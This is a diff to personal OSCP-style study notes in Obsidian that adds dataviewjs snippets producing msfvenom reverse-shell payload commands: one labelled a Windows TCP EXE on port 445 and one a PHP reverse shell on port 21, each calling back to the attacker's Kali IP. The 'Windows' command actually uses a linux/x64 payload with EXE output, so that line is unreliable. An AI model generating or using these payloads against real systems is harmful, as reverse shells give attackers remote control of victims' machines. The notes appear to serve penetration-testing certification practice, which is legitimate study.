@@ -2,6 +2,8 @@ https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 https://www.revshells.com
 
+[[msfvenom]]
+
 Find out which architecture is supported
 ```
 which python3 python perl ruby socat script
@@ -265,6 +267,23 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 ## MSFVENOM
 ---
+
+Windows TCP Reverse shell EXE | PORT 445 | shell.exe
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=445 -f exe > shell.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+PHP reverse shell | PORT 21 | `phpreverseshell.php`
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `msfvenom -p php/reverse_php LHOST=${KaliIP} LPORT=21 -f raw > phpreverseshell.php`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
